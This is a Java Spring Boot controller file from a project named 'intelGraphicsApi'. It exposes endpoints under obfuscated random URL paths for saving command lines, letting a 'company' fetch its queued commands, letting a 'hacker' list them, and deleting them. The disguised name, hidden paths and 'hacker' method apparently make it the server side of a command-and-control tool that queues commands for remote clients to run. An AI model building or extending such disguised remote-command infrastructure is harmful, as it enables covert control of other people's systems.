package com.example.intelGraphicsApi.controller;

import com.example.intelGraphicsApi.entity.Token;
import com.example.intelGraphicsApi.entity.vm.CommandToCompany;
import com.example.intelGraphicsApi.entity.vm.CommandVM;
import com.example.intelGraphicsApi.entity.vm.Entry;
import com.example.intelGraphicsApi.entity.vm.StringCommand;
import com.example.intelGraphicsApi.service.CommandService;
import com.example.intelGraphicsApi.service.TokenService;
import lombok.AllArgsConstructor;
import org.springframework.web.bind.annotation.*;
import java.util.List;
import java.util.Optional;


@RestController
@RequestMapping(path = "/hdowbojiwtrydczsbepd/command/pjjeaizwszrqypydnqyp")
@AllArgsConstructor
public class CommandController {
    CommandService commandService;
    TokenService tokenService;
    @PostMapping(path = "/new/pjjeaizwszrqypydnqyp")
        public void newCommand(@RequestBody StringCommand commandLine, @RequestHeader String token){
            commandService.save(commandLine,token);
        }
        @PostMapping(path = "/commands/pjjeaizwszrqypydnqyp")
        public List<CommandVM> getCommandsCompany(@RequestBody Entry entity){
            return commandService.getCommand(entity).stream().map(CommandVM::new).toList();

        }
        @GetMapping(path = "/commands/pjjeaizwszrqypydnqyp")
        public List<CommandVM> getCommandsHacker(@RequestHeader(name = "company") String company, @RequestHeader(name = "token") String token){

            return commandService.getCommandById(company,token).stream().map(CommandVM::new).toList();
        }
        @DeleteMapping(path = "/delete-current-command")
        public void deleteCommand(@RequestHeader long id,@RequestHeader String token){
            Optional<Token> optionalToken =  tokenService.isToken(token);
            if (optionalToken.isPresent()){
                commandService.deleteForFile(id);
            }
        }

}
